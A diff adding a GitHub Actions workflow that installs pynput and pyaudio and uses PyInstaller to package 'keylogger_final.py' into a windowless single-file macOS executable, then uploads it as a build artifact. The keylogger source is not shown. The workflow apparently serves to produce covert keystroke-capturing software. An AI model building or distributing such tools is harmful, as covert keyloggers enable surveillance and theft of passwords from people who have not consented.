@@ -1,0 +1,31 @@
+name: Build macOS Executable
+
+on:
+  workflow_dispatch:  # Permite ejecutarlo manualmente
+
+jobs:
+  build:
+    runs-on: macos-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          brew install portaudio
+          pip install pyinstaller pandas pynput pyaudio
+
+      - name: Build executable
+        run: |
+          pyinstaller --onefile --windowed keylogger_final.py
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: macOS-executable
+          path: dist/keylogger_final
